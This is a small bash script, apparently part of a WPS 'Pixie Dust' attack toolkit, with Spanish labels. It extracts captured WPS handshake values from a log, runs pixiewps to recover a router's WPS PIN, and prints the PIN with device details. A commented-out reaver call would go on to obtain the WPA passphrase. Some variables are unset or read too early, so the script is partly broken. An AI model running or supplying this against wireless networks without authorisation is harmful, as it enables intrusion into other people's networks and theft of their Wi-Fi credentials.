#!/bin/bash
clear



pke=$(grep -i "pke:" "log.txt" | awk '{print $2}')
pkr=$(grep -i "pkr:" "log.txt" | awk '{print $2}')
ehash1=$(grep -i "e-hash1:" "log.txt" | awk '{print $2}')
ehash2=$(grep -i "e-hash2:" "log.txt" | awk '{print $2}')
authkey=$(grep -i "Authkey:" "log.txt" | awk '{print $2}')
enonce=$(grep -i "e-nonce:" "log.txt" | awk '{print $2}')
Fabricante=$(grep -i "Fabricante" "log.txt") 
Modelo=$(grep -i "Modelo" "log.txt") 
Numero_de_modelo=$(grep -i "Numero de modelo" "log.txt")
Numero_de_serie=$(grep -i "Numero de serie" "log.txt")
Device=$(grep -i "Device" "log.txt") 
ESSID=$(grep -i "ESSID" "log.txt" | awk '{print $6}') 
BSSID=$(grep -i "ESSID" "log.txt" | awk '{print $4}') 


time=$(grep -i "time" "pixie.txt")

pixiewps -e $pke -r $pkr -s $ehash1 -z $ehash2 -a $authkey -n $enonce > pixie.txt

FILE=pixie.txt     
if [ -f $FILE ]; then

pin=$(grep -i "pin" "pixie.txt" | awk '{print $4}')

echo $BS
echo $CH
#reaver_pixie -i mon0 -b $BS -c $CH -p $pin -vv  > done.txt



#pin2=$(grep -i "WPS PIN:" "done.txt")
#pwd=$(grep -i "WPA PSK:" "done.txt")
#SSID=$(grep -i "AP SSID:" "done.txt")



echo $Fabricante
echo $Modelo
echo $Numero_de_modelo
echo $Numero_de_serie
echo $Device
echo - Type $ESSID
echo  ====================== ======== ===================
echo  $time
echo  Pin : $pin
#echo  $pin2
#echo  $pwd
#echo  $SSID
fi